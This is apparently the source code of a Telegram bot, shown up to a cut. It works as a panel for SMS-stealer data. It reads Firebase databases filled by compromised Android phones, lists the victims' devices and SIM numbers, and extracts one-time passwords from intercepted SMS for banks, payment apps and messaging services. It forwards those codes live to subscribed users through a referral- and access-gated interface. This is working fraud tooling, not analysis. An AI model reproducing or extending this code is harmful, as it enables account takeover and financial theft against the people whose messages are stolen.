#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════════════════
   SHOWN PANEL BOT — v10.2 FINAL
   Reply Keyboard • Quote UI • Live OTP Forward • User OTP Hub
══════════════════════════════════════════════════════════════════
"""
import os
import re
import gc
import csv
import json
import time
import io
import asyncio
import hashlib
import logging
import shutil
import sqlite3
import tempfile
from datetime import datetime, timedelta
from typing import Optional, Any
from html import escape

import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, Bot,
)
from telegram.constants import ParseMode
from telegram.error import Conflict, Forbidden, ChatMigrated
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

# ══════════════════════════════════════════════════════════════════
# UI HELPERS
# ══════════════════════════════════════════════════════════════════
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.WARNING)
_log = logging.getLogger("panel")

_SMALL_CAPS = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789",
)

def sc(s: str) -> str:
    return str(s).translate(_SMALL_CAPS)

def esc(s: Any) -> str:
    return escape(str(s if s is not None else ""))

def em(eid: str, fallback: str = "⭐") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

def q(inner: str, header: str = "") -> str:
    body = f"<b>{sc(header)}</b>\n{inner}" if header else inner
    return f"<blockquote>{body}</blockquote>"

def qres(icon: str, title: str, lines: list) -> str:
    body = "\n".join(lines)
    return f"<blockquote>{em(icon, '✨')} <b>{sc(title)}</b>\n\n{body}</blockquote>"

def ibtn(text: str, *, cb: str = None, url: str = None,
         copy_text: str = None, eid: str = None, style: str = None) -> InlineKeyboardButton:
    kwargs: dict = {"text": text}
    if cb: kwargs["callback_data"] = cb
    if url: kwargs["url"] = url
    if copy_text: kwargs["copy_text"] = copy_text
    ak: dict = {}
    if eid: ak["icon_custom_emoji_id"] = eid
    if style in ("primary", "success", "danger"): ak["style"] = style
    if ak: kwargs["api_kwargs"] = ak
    return InlineKeyboardButton(**kwargs)

def rbtn(text: str, eid: str = None, style: str = "primary") -> KeyboardButton:
    ak: dict = {"style": style}
    if eid: ak["icon_custom_emoji_id"] = eid
    return KeyboardButton(text=text, api_kwargs=ak)

# ══════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════
DATABASES: dict = {}
DEAD_FB_HOURS = 24
ACTIVE_FB_HOURS = 24
SMS_LIMIT = 10
DB_CONCURRENCY = 50
POLL_INTERVAL = 10
TOKEN = os.environ.get("BOT_TOKEN", "")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "@shownXpannelbot")
DB_FILE = "bot_database.json"
BACKUP_DIR = "backups"
os.makedirs(BACKUP_DIR, exist_ok=True)

BOT_BRAND_NAME = os.environ.get("BOT_BRAND_NAME", "QURESHIxOTP")
OWNER_DISPLAY_NAME = os.environ.get("OWNER_DISPLAY_NAME", "Shown")
OWNER_CONTACT = os.environ.get("OWNER_CONTACT", "@WhoIsShown")

OWNER_HARD_ID = 8984851474
OWNER_IDS: set = {OWNER_HARD_ID}
ADMIN_IDS: set = {OWNER_HARD_ID}

# ══════════════════════════════════════════════════════════════════
# STATE
# ══════════════════════════════════════════════════════════════════
all_users: dict = {}
allowed_users: set = set()
ADMIN_ONLY_TAGS: set = set()
GLOBAL_DEVICE_CACHE: dict = {}
seen_ids: set = set()
MAX_SEEN_IDS = 200000
first_run = True

FORCE_JOIN_ENABLED = False
FORCE_JOIN_CHANNELS: list = []
GRANT_ACCESS_REQUIRED = True
REFERRAL_ENABLED = True
REQUIRED_REFERRALS = 2

WELCOME_MEDIA: dict = {"file_id": None, "type": "video", "spoiler": False}
ROTATION_MEDIA: list = []
WELCOME_TEXT = ""
HELP_TEXT = ""

AUTO_BACKUP_CHAT: int = 0
AUTO_BACKUP_TIMES: list = []
AUTO_BACKUP_ENABLED = False
BACKUP_FIRED: dict = {}

CLONES: list = []
CLONE_APPS: dict = {}

MAINTENANCE_MODE = False

pending_action: dict = {}
user_cooldowns: dict = {}
chats_registry: set = set()

_chat_shortcut_cache: dict = {}
_chat_page_cache: dict = {}

user_focus: dict = {}
_main_app: Optional[Application] = None

USER_OTP_HISTORY: dict = {}
MAX_USER_HISTORY = 500

# ══════════════════════════════════════════════════════════════════
# SITE MAP
# ══════════════════════════════════════════════════════════════════
SITE_MAP: dict = {
    "google":     ("Google",     "5224607267797606837"),
    "gmail":      ("Gmail",      "5253742260054409879"),
    "whatsapp":   ("WhatsApp",   "5339233635620899144"),
    "facebook":   ("Facebook",   "6206497372176913599"),
    "instagram":  ("Instagram",  "6206404510689007446"),
    "amazon":     ("Amazon",     "5404561694510833322"),
    "flipkart":   ("Flipkart",   "5404561694510833322"),
    "paytm":      ("Paytm",      "5404561694510833322"),
    "phonepe":    ("PhonePe",    "5404561694510833322"),
    "gpay":       ("Google Pay", "5404561694510833322"),
    "telegram":   ("Telegram",   "5253742260054409879"),
    "twitter":    ("Twitter/X",  "6206497372176913599"),
    "snapchat":   ("Snapchat",   "6206404510689007446"),
    "netflix":    ("Netflix",    "5372849966689566579"),
    "uber":       ("Uber",       "5372849966689566579"),
    "ola":        ("Ola",        "5372849966689566579"),
    "swiggy":     ("Swiggy",     "5440621591387980068"),
    "zomato":     ("Zomato",     "5440621591387980068"),
    "paypal":     ("PayPal",     "5404561694510833322"),
    "sbi":        ("SBI Bank",   "5404561694510833322"),
    "hdfc":       ("HDFC Bank",  "5404561694510833322"),
    "icici":      ("ICICI Bank", "5404561694510833322"),
    "bank":       ("Bank",       "5404561694510833322"),
    "microsoft":  ("Microsoft",  "6204162490515855272"),
    "apple":      ("Apple",      "6206404510689007446"),
    "discord":    ("Discord",    "6206497372176913599"),
    "linkedin":   ("LinkedIn",   "6206497372176913599"),
    "truecaller": ("Truecaller", "5253742260054409879"),
}

# ══════════════════════════════════════════════════════════════════
# PERSISTENCE
# ══════════════════════════════════════════════════════════════════
def _db_snapshot() -> dict:
    return {
        "all_users": {str(k): v for k, v in all_users.items()},
        "DATABASES": DATABASES,
        "allowed_users": sorted(allowed_users),
        "admin_only_tags": sorted(ADMIN_ONLY_TAGS),
        "force_join_enabled": FORCE_JOIN_ENABLED,
        "force_join_channels": FORCE_JOIN_CHANNELS,
        "grant_access_required": GRANT_ACCESS_REQUIRED,
        "referral_enabled": REFERRAL_ENABLED,
        "required_referrals": REQUIRED_REFERRALS,
        "welcome_media": WELCOME_MEDIA,
        "rotation_media": ROTATION_MEDIA,
        "welcome_text": WELCOME_TEXT,
        "help_text": HELP_TEXT,
        "auto_backup_chat": AUTO_BACKUP_CHAT,
        "auto_backup_times": AUTO_BACKUP_TIMES,
        "auto_backup_enabled": AUTO_BACKUP_ENABLED,
        "clones": CLONES,
        "maintenance_mode": MAINTENANCE_MODE,
        "dead_fb_hours": DEAD_FB_HOURS,
        "active_fb_hours": ACTIVE_FB_HOURS,
        "user_otp_history": {str(k): v for k, v in USER_OTP_HISTORY.items()},
        "user_focus": {str(k): v for k, v in user_focus.items()},
    }

def save_data() -> None:
    try:
        payload = _db_snapshot()
        fd, tmp = tempfile.mkstemp(dir=".", prefix=".db_", suffix=".json")
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False, default=str)
        if os.path.exists(DB_FILE):
            try: shutil.copyfile(DB_FILE, DB_FILE + ".bak")
            except Exception: pass
        os.replace(tmp, DB_FILE)
    except Exception as e:
        _log.error(f"save_data: {e}")

def load_data() -> None:
    global DATABASES, allowed_users, ADMIN_ONLY_TAGS
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, GRANT_ACCESS_REQUIRED
    global REFERRAL_ENABLED, REQUIRED_REFERRALS
    global WELCOME_MEDIA, ROTATION_MEDIA, WELCOME_TEXT, HELP_TEXT
    global AUTO_BACKUP_CHAT, AUTO_BACKUP_TIMES, AUTO_BACKUP_ENABLED
    global CLONES, MAINTENANCE_MODE, DEAD_FB_HOURS, ACTIVE_FB_HOURS

    if not os.path.exists(DB_FILE):
        return
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except Exception:
        try:
            with open(DB_FILE + ".bak", "r", encoding="utf-8") as f:
                raw = json.load(f)
        except Exception:
            return

    all_users.clear()
    for k, v in raw.get("all_users", {}).items():
        try: all_users[int(k)] = v
        except Exception: pass
    DATABASES = dict(raw.get("DATABASES", {}))
    allowed_users = set(int(x) for x in raw.get("allowed_users", []))
    ADMIN_ONLY_TAGS = set(raw.get("admin_only_tags", []))
    FORCE_JOIN_ENABLED = bool(raw.get("force_join_enabled", False))
    FORCE_JOIN_CHANNELS = list(raw.get("force_join_channels", []) or [])
    GRANT_ACCESS_REQUIRED = bool(raw.get("grant_access_required", True))
    REFERRAL_ENABLED = bool(raw.get("referral_enabled", True))
    REQUIRED_REFERRALS = max(0, int(raw.get("required_referrals", 2)))
    WELCOME_MEDIA = raw.get("welcome_media") or {"file_id": None, "type": "video", "spoiler": False}
    ROTATION_MEDIA = list(raw.get("rotation_media", []) or [])
    WELCOME_TEXT = raw.get("welcome_text", "") or ""
    HELP_TEXT = raw.get("help_text", "") or ""
    AUTO_BACKUP_CHAT = int(raw.get("auto_backup_chat", 0) or 0)
    AUTO_BACKUP_TIMES = list(raw.get("auto_backup_times", []) or [])
    AUTO_BACKUP_ENABLED = bool(raw.get("auto_backup_enabled", False))
    CLONES = list(raw.get("clones", []) or [])
    MAINTENANCE_MODE = bool(raw.get("maintenance_mode", False))
    DEAD_FB_HOURS = max(1, int(raw.get("dead_fb_hours", 24)))
    ACTIVE_FB_HOURS = max(1, int(raw.get("active_fb_hours", 24)))

    USER_OTP_HISTORY.clear()
    for k, v in raw.get("user_otp_history", {}).items():
        try: USER_OTP_HISTORY[int(k)] = list(v)
        except Exception: pass

    user_focus.clear()
    for k, v in raw.get("user_focus", {}).items():
        try: user_focus[int(k)] = str(v)
        except Exception: pass

    ADMIN_IDS.clear(); ADMIN_IDS.add(OWNER_HARD_ID)
    OWNER_IDS.clear(); OWNER_IDS.add(OWNER_HARD_ID)

# ══════════════════════════════════════════════════════════════════
# ACCESS CONTROL
# ══════════════════════════════════════════════════════════════════
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS or uid in OWNER_IDS

def referral_count(uid: int) -> int:
    return len(set(map(str, all_users.get(uid, {}).get("referrals", []) or [])))

def has_access(uid: int) -> bool:
    if is_admin(uid) or uid in allowed_users: return True
    if not GRANT_ACCESS_REQUIRED: return True
    if REFERRAL_ENABLED and referral_count(uid) >= REQUIRED_REFERRALS: return True
    return False

def grant_access(uid: int) -> None:
    allowed_users.add(uid); save_data()

def revoke_access(uid: int) -> None:
    allowed_users.discard(uid); save_data()

async def is_force_joined(bot: Bot, uid: int) -> bool:
    if not FORCE_JOIN_ENABLED or not FORCE_JOIN_CHANNELS: return True
    for ch in FORCE_JOIN_CHANNELS:
        c = str(ch.get("channel", "")).strip()
        if not c: continue
        try:
            m = await bot.get_chat_member(chat_id=c, user_id=uid)
            if str(m.status).lower() in ("creator", "administrator", "member"): continue
            if str(m.status).lower() == "restricted" and getattr(m, "is_member", False): continue
            return False
        except Exception:
            continue
    return True

async def gate_state(bot: Bot, uid: int):
    if is_admin(uid): return True, "ready"
    if FORCE_JOIN_ENABLED and not await is_force_joined(bot, uid): return False, "force_join"
    if not GRANT_ACCESS_REQUIRED: return True, "ready"
    ud = all_users.get(uid, {})
    if ud.get("referred_by") and not ud.get("referral_qualified") and await is_force_joined(bot, uid):
        ref = int(ud["referred_by"])
        if ref in all_users and ref != uid:
            refs = all_users.setdefault(ref, {}).setdefault("referrals", [])
            if str(uid) not in set(map(str, refs)): refs.append(uid)
            ud["referral_qualified"] = True
            save_data()
    if REFERRAL_ENABLED and not has_access(uid): return False, "referrals"
    return True, "ready"

# ══════════════════════════════════════════════════════════════════
# FIREBASE CLIENT
# ══════════════════════════════════════════════════════════════════
_http: Optional[aiohttp.ClientSession] = None

async def _session() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=120, ttl_dns_cache=300, keepalive_timeout=30),
            timeout=aiohttp.ClientTimeout(total=8, connect=3),
        )
    return _http

async def fb_get(path: str, base: str):
    try:
        s = await _session()
        url = f"{base.rstrip('/')}/{path}.json" if path else f"{base.rstrip('/')}/.json"
        async with s.get(url) as r:
            if r.status != 200: return None
            return await r.json(content_type=None)
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list:
    try:
        s = await _session()
        url = f"{base.rstrip('/')}/{path}.json?shallow=true" if path else f"{base.rstrip('/')}/.json?shallow=true"
        async with s.get(url) as r:
            if r.status != 200: return []
            d = await r.json(content_type=None)
            return list(d.keys()) if isinstance(d, dict) else []
    except Exception:
        return []

async def fb_patch(path: str, payload: dict, base: str) -> bool:
    try:
        s = await _session()
        async with s.patch(f"{base.rstrip('/')}/{path}.json", json=payload) as r:
            return r.status == 200
    except Exception:
        return False

# ══════════════════════════════════════════════════════════════════
# FIREBASE ACTIVE / DEAD
# ══════════════════════════════════════════════════════════════════
async def check_db_active(url: str, hours: int = 24):
    try:
        clients = await fb_keys("clients", url)
        if not clients: clients = await fb_keys("user_data", url)
        if not clients: clients = await fb_keys("All_Users/simDetails", url)
        dev_count = len(clients or [])
        if dev_count == 0: return False, 0, 0
        cutoff = (time.time() - hours * 3600) * 1000
        fresh = 0
        for dev_id in (clients or [])[:6]:
            data = await fb_get(f"All_Users/sms/{dev_id}", url)
            if not isinstance(data, dict): continue
            for _, v in data.items():
                if not isinstance(v, dict): continue
                try: ts = int(v.get("timestamp", 0) or 0)
                except Exception: continue
                if ts >= cutoff: fresh += 1
        return (fresh > 0 or dev_count > 0), dev_count, fresh
    except Exception:
        return False, 0, 0

# ══════════════════════════════════════════════════════════════════
# DEVICE
# ══════════════════════════════════════════════════════════════════
class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp",
                 "numbers", "device_info", "sms_path", "base_url", "db_tag")
    def __init__(self, **kw):
        for k in self.__slots__: setattr(self, k, kw.get(k))

def _ts_num(v) -> float:
    try: return float(v or 0)
    except Exception: return 0.0

def _parse_batt(v) -> int:
    if isinstance(v, (int, float)): return int(v)
    if isinstance(v, str):
        d = re.sub(r"\D", "", v); return int(d) if d else 0
    return 0

def _status_str(v) -> str:
    if v is True: return "online"
    return "online" if str(v).lower() == "online" else "offline"

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n or ""))
    if not c: return ""
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    return f"+{c}"

async def fetch_db_devices(tag: str, url: str) -> list:
    devices: list = []
    seen: set = set()

    sim, info, ud, cl = await asyncio.gather(
        fb_get("All_Users/simDetails", url),
        fb_get("All_Users/Data/DeviceInfo", url),
        fb_get("user_data", url),
        fb_get("clients", url),
    )

    if isinstance(sim, dict):
        inf = info if isinstance(info, dict) else {}
        for dev_id, s in sim.items():
            if dev_id in seen: continue
            seen.add(dev_id)
            i = inf.get(dev_id) or {}
            nums = [fmt_num((s or {}).get(f, "")) for f in ("sim1Number", "sim2Number")]
            nums = [n for n in nums if n]
            model = i.get("DeviceModel") or i.get("Brand") or f"Device-{dev_id[:6]}"
            devices.append(Device(id=dev_id, name=model, status=_status_str(i.get("Status")),
                                  battery=_parse_batt(i.get("Battery")),
                                  timestamp=int(i.get("currentTimeMillis") or 0),
                                  numbers=nums,
                                  device_info=f"Model: {model}\nBrand: {i.get('Brand','')}\nID: {dev_id}",
                                  sms_path=f"All_Users/sms/{dev_id}",
                                  base_url=url, db_tag=tag))

    if isinstance(ud, dict):
        for dev_id, d in ud.items():
            if dev_id in seen or not isinstance(d, dict): continue
            seen.add(dev_id)
            nums = [fmt_num(d.get(f, "")) for f in ("numberSim1", "numberSim2", "mobNo")]
            nums = [n for n in nums if n]
            devices.append(Device(id=dev_id, name=d.get("d_name") or f"Device-{dev_id[:6]}",
                                  status=_status_str(d.get("status")),
                                  battery=_parse_batt(d.get("battery")),
                                  timestamp=int(d.get("timestamp") or 0),
                                  numbers=nums,
                                  device_info=d.get("Device_info") or f"ID: {dev_id}",
                                  sms_path=f"user_sms/{dev_id}",
                                  base_url=url, db_tag=tag))

    if isinstance(cl, dict):
        for dev_id, c in cl.items():
            if dev_id in seen or not isinstance(c, dict): continue
            nums = []
            mob = c.get("mobNo")
            if mob: nums.append(fmt_num(mob))
            elif isinstance(c.get("sims"), list) and c["sims"]:
                ph = (c["sims"][0] or {}).get("phoneNumber")
                if ph: nums.append(fmt_num(ph))
            nums = [n for n in nums if n]
            if not nums and not c.get("modelName"): continue
            seen.add(dev_id)
            model = c.get("modelName") or f"Device-{dev_id[:6]}"
            devices.append(Device(id=dev_id, name=model, status=_status_str(c.get("status")),
                                  battery=_parse_batt(c.get("battery")),
                                  timestamp=0, numbers=nums,
                                  device_info=f"Model: {model}\nID: {dev_id}",
                                  sms_path=f"All_Users/sms/{dev_id}",
                                  base_url=url, db_tag=tag))

    # 4th schema: 16-hex-char device ids
    try:
        root_keys = await fb_keys("", url)
        hex_keys = [k for k in (root_keys or [])
                    if len(k) == 16 and re.fullmatch(r"[0-9a-fA-F]{16}", k)]
        if hex_keys:
            async def _fetch_t4(k):
                return k, await fb_get(f"{k}/deviceInfo", url), \
                          await fb_get(f"{k}/simInfo", url), \
                          await fb_get(f"{k}/heartbeat", url)
            t4 = await asyncio.gather(*(_fetch_t4(k) for k in hex_keys))
            for k, inf, sim2, hb in t4:
                if not isinstance(inf, dict) or k in seen: continue
                seen.add(k)
                nums = []
                if isinstance(sim2, dict):
                    for sv in sim2.values():
                        if isinstance(sv, dict):
                            n = sv.get("number", "")
                            if n and len(re.sub(r"\D", "", n)) > 4:
                                nums.append(fmt_num(n))
                model = inf.get("model") or inf.get("brand") or f"Device-{k[:6]}"
                try: ts = int(hb) if isinstance(hb, (int, float)) else 0
                except Exception: ts = 0
                status = "online" if ts and (time.time() * 1000 - ts) < 300000 else "offline"
                devices.append(Device(id=k, name=model, status=status, battery=0,
                                      timestamp=ts, numbers=nums,
                                      device_info=f"Model: {model}\nID: {k}",
                                      sms_path=f"{k}/receivedSms",
                                      base_url=url, db_tag=tag))
    except Exception:
        pass

    return devices

async def get_all_devices(admin: bool = True) -> list:
    out: list = []
    for tag in DATABASES.keys():
        if not admin and tag in ADMIN_ONLY_TAGS: continue
        out.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    uniq = {}
    for d in out:
        if d.id not in uniq: uniq[d.id] = d
    lst = list(uniq.values())
    lst.sort(key=lambda d: (0 if d.status == "online" else 1,
                            0 if d.numbers else 1, -_ts_num(d.timestamp)))
    return lst

async def get_device_sms(dev: Device, limit: int = SMS_LIMIT) -> list:
    data = await fb_get(dev.sms_path, dev.base_url)
    if not isinstance(data, dict): return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ══════════════════════════════════════════════════════════════════
# OTP
# ══════════════════════════════════════════════════════════════════
_OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.I),
    re.compile(r"code[^\d]*(\d{4,8})", re.I),
    re.compile(r"password[^\d]*(\d{4,8})", re.I),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for p in _OTP_PATTERNS:
        m = p.search(text or "")
        if m: return m.group(1)
    return None

def sms_date(sms: dict) -> str:
    d = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if d: return str(d)
    ts = sms.get("timestamp")
    if ts:
        try:
            t = float(ts); t = t/1000 if t > 1e11 else t
            return datetime.fromtimestamp(t).strftime("%d %b %Y %I:%M %p")
        except Exception: pass
    return "—"

def _detect_site(sender: str, body: str):
    combined = (str(sender or "") + " " + str(body or "")).lower()
    for key, (name, eid) in SITE_MAP.items():
        if key in combined:
            return name, eid
    s = str(sender or "").strip()
    if s and not s.isdigit() and len(s) >= 3:
        return s[:20], "5253742260054409879"
    return "Unknown", "5253742260054409879"

def seen_key(device_id: str, sms_key: str) -> str:
    return f"{device_id}/{sms_key}"

# ══════════════════════════════════════════════════════════════════
# USER OTP LOG
# ══════════════════════════════════════════════════════════════════
def _log_user_otp(uid: int, number: str, sender: str, otp: str,
                  body: str, ts: int, panel: str) -> None:
    if not uid or not otp: return
    try:
        ts_i = int(ts or 0)
        if ts_i <= 0: ts_i = int(time.time() * 1000)
        if ts_i < 1e11: ts_i *= 1000
    except Exception:
        ts_i = int(time.time() * 1000)

    site, eid = _detect_site(sender, body)
    entry = {
        "number": str(number or "—"),
        "sender": str(sender or "—"),
        "otp": str(otp),
        "site": site,
        "site_eid": eid,
        "ts": ts_i,
        "panel": str(panel or "—"),
    }
    hist = USER_OTP_HISTORY.setdefault(uid, [])
    for e in hist:
        if e.get("number") == entry["number"] and e.get("otp") == entry["otp"]:
            return
    hist.insert(0, entry)
    if len(hist) > MAX_USER_HISTORY: del hist[MAX_USER_HISTORY:]
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_deferred_save())
    except RuntimeError:
        save_data()

async def _deferred_save() -> None:
    await asyncio.sleep(0.5)
    save_data()

# ══════════════════════════════════════════════════════════════════
# LIVE OTP FORWARD
# ══════════════════════════════════════════════════════════════════
async def seed_seen_ids_for_db(url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url)
        )
        for bulk in (r_main, r_user):
            if isinstance(bulk, dict):
                for dev_id, sd in bulk.items():
                    if isinstance(sd, dict):
                        for k in sd:
                            seen_ids.add(seen_key(dev_id, k))
    except Exception:
        pass

async def _forward_otp_only(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    otp = extract_otp(body)
    if not otp: return

    num = device.numbers[0] if device.numbers else device.name
    sender = sms.get("sender", "—")
    site, eid = _detect_site(sender, body)
    icon = em(eid, "🌐")
    ts = int(sms.get("timestamp") or 0)
    try:
        dt = datetime.fromtimestamp(ts / 1000 if ts > 1e11 else ts).strftime("%d %b %Y · %I:%M %p")
    except Exception:
        dt = sms_date(sms)

    text = qres("4958689671950369798", "new otp received", [
        f"{icon} <b>{esc(site)}</b>",
        f"",
        f"🔑 <code>{esc(otp)}</code>",
        f"📞 <code>{esc(num)}</code>",
        f"👤 from: {esc(str(sender)[:30])}",
        f"📅 {esc(dt)}",
        f"🔥 <code>{esc(device.db_tag)}</code>",
        f"",
        f"💬 {esc(body[:300])}",
    ])

    copy_kb = InlineKeyboardMarkup([[
        ibtn(f"🔑 Copy OTP {otp}", copy_text=otp,
             eid="4958689671950369798", style="success"),
        ibtn("🔕 Stop watching", cb=f"unwatch:{device.id}",
             eid="5246772116543512028", style="danger"),
    ]])

    if _main_app is None: return
    is_admin_device = device.db_tag in ADMIN_ONLY_TAGS
    for cid, dev_id in list(user_focus.items()):
        if dev_id != device.id: continue
        if all_users.get(cid, {}).get("banned"): continue
        if not has_access(cid): continue
        if is_admin_device and cid not in ADMIN_IDS: continue
        try:
            await _main_app.bot.send_message(
                chat_id=cid, text=text,
                reply_markup=copy_kb, parse_mode="HTML",
                disable_web_page_preview=True,
            )
            _log_user_otp(uid=cid, number=num, sender=sender,
                          otp=otp, body=body, ts=ts, panel=device.db_tag)
        except Exception as e:
            _log.warning(f"forward otp to {cid}: {e}")

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url)
        )
        device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
        for bulk in (r_main, r_user):
            if not isinstance(bulk, dict): continue
            for dev_id, sd in bulk.items():
                if not isinstance(sd, dict): continue
                if dev_id not in device_map: continue
                for k, sms in sd.items():
                    skey = seen_key(dev_id, k)
                    if skey in seen_ids: continue
                    seen_ids.add(skey)
                    if not isinstance(sms, dict): continue
                    try:
                        await _forward_otp_only(device_map[dev_id], sms)
                    except Exception as e:
                        _log.warning(f"forward {dev_id}/{k}: {e}")
        if len(seen_ids) > MAX_SEEN_IDS:
            keep = list(seen_ids)[-(MAX_SEEN_IDS // 2):]
            seen_ids.clear(); seen_ids.update(keep)
    except Exception as e:
        _log.warning(f"poll_single_db {tag}: {e}")

# ══════════════════════════════════════════════════════════════════
# SNAPSHOT / IMPORT / EXPORT
# ══════════════════════════════════════════════════════════════════
def db_snapshot_bytes() -> bytes:
    return json.dumps(_db_snapshot(), indent=2, default=str).encode("utf-8")

def export_sqlite_bytes() -> bytes:
    fd, path = tempfile.mkstemp(suffix=".sqlite"); os.close(fd)
    try:
        con = sqlite3.connect(path); cur = con.cursor()
        cur.execute("CREATE TABLE users (uid TEXT PRIMARY KEY, name TEXT, username TEXT, "
                    "credits INT, banned INT, joined_at TEXT)")
        for uid, u in all_users.items():
            cur.execute("INSERT OR REPLACE INTO users VALUES (?,?,?,?,?,?)",
                        (str(uid), u.get("name",""), u.get("username",""),
                         u.get("credits",0), 1 if u.get("banned") else 0,
                         u.get("joined_at","")))
        cur.execute("CREATE TABLE firebases (tag TEXT PRIMARY KEY, url TEXT)")
        for tag, url in DATABASES.items():
            cur.execute("INSERT OR REPLACE INTO firebases VALUES (?,?)", (tag, url))
        con.commit(); con.close()
        with open(path, "rb") as f: return f.read()
    finally:
        try: os.unlink(path)
        except: pass

def import_sqlite(blob: bytes) -> dict:
    fd, path = tempfile.mkstemp(suffix=".sqlite"); os.close(fd)
    try:
        with open(path, "wb") as f: f.write(blob)
        con = sqlite3.connect(path); cur = con.cursor()
        out = {"users": {}, "firebases": {}}
        try:
            cur.execute("SELECT * FROM users")
            for row in cur.fetchall():
                out["users"][str(row[0])] = {
                    "name": row[1] or "", "username": row[2] or "",
                    "credits": row[3] or 0, "banned": bool(row[4]),
                    "joined_at": row[5] or "",
                }
        except Exception: pass
        try:
            cur.execute("SELECT * FROM firebases")
            for row in cur.fetchall():
                out["firebases"][row[0]] = row[1]
        except Exception: pass
        con.close()
        return out
    finally:
        try: os.unlink(path)
        except: pass

def import_json(blob: bytes) -> dict:
    raw = json.loads(blob.decode("utf-8", errors="ignore"))
    out = {"users": {}, "firebases": {}}
    users = raw.get("all_users") or raw.get("users") or {}
    for k, v in users.items():
        if isinstance(v, dict): out["users"][str(k)] = v
    fbs = raw.get("DATABASES") or raw.get("firebases") or {}
    if isinstance(fbs, dict): out["firebases"] = dict(fbs)
    return out

# ══════════════════════════════════════════════════════════════════
# REPLY KEYBOARDS
# ══════════════════════════════════════════════════════════════════
def main_menu_kb(admin: bool) -> ReplyKeyboardMarkup:
    rows = [
        [rbtn(sc("Devices List"), "5224607267797606837", "primary"),
         rbtn(sc("All Panels"), "5372849966689566579", "primary")],
        [rbtn(sc("Search Number"), "5404561694510833322", "primary"),
         rbtn(sc("Keyword Search"), "6206479140040743133", "primary")],
        [rbtn(sc("Recent OTPs"), "5206318837489743801", "success"),
         rbtn(sc("Panel Status"), "6206446249181189526", "success")],
        [rbtn(sc("User Hub"), "5339233635620899144", "primary"),
         rbtn(sc("Media Manager"), "5253742260054409879", "primary")],
        [rbtn(sc("Auto Backup"), "5440621591387980068", "success"),
         rbtn(sc("Clone Bot"), "5235588635885054955", "primary")],
        [rbtn(sc("Database"), "6206497372176913599", "primary"),
         rbtn(sc("My Profile"), "5339233635620899144", "primary")],
    ]
    if admin:
        rows.append([rbtn(sc("Admin Panel"), "6206404510689007446", "danger"),
                     rbtn(sc("Ping"), "5253742260054409879", "success")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def admin_menu_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [rbtn(sc("Add DB (Active Only)"), "5440621591387980068", "success"),
         rbtn(sc("Add DB (All)"), "5224607267797606837", "primary")],
        [rbtn(sc("Purge Dead DBs"), "5246772116543512028", "danger"),
         rbtn(sc("List DBs"), "5372849966689566579", "primary")],
        [rbtn(sc("User Manager"), "5339233635620899144", "primary"),
         rbtn(sc("Access Control"), "5339286072876614251", "primary")],
        [rbtn(sc("Force Join"), "5246772116543512028", "primary"),
         rbtn(sc("Referral Gate"), "5084613633418199991", "primary")],
        [rbtn(sc("Broadcast"), "5253742260054409879", "primary"),
         rbtn(sc("Dashboard"), "5206318837489743801", "success")],
        [rbtn(sc("Maintenance"), "6206174450765796040", "danger"),
         rbtn(sc("Logs"), "6204162490515855272", "primary")],
        [rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def user_hub_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [rbtn(sc("My Profile"), "5339233635620899144", "primary"),
         rbtn(sc("My Stats"), "5206318837489743801", "success")],
        [rbtn(sc("My OTPs"), "5206318837489743801", "primary"),
         rbtn(sc("My Referrals"), "5084613633418199991", "primary")],
        [rbtn(sc("Support"), "5253742260054409879", "primary"),
         rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def media_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [rbtn(sc("Set Welcome Media"), "5253742260054409879", "primary"),
